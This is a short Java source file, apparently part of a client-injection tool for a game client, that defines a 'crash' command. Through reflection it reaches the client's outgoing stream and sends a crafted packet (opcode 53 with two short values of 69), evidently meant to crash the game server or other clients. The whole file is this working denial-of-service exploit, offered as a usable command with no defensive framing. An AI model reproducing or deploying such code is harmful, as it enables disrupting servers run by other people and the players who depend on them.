package demmonic.user.server.deob.command;

import demmonic.Command;
import demmonic.Loader;
import demmonic.container.reflect.ReflectionClass;
import demmonic.container.reflect.ReflectionMethod;

public class CrashCommand extends Command {

	public CrashCommand() {
		super("crash");
	}

	@Override
	public void parse(String input) {
		ReflectionClass clazz = Loader.getClass("client");
		Object outBuffer = clazz.getField("stream", "Stream").getValue();
		
		ReflectionClass bufferClass = new ReflectionClass(outBuffer.getClass(), outBuffer);
		ReflectionMethod writeOpcodeMethod = bufferClass.getMethod("createFrame", int.class);
		ReflectionMethod writeShortMethod = bufferClass.getMethod("writeWord", int.class);
		ReflectionMethod writeShortAMethod = bufferClass.getMethod("method432", int.class);
		
		writeOpcodeMethod.invoke(53);
		writeShortMethod.invoke(69);
		writeShortAMethod.invoke(69);
	}

	@Override
	public String getSyntax() {
		return "crash";
	}
	
}
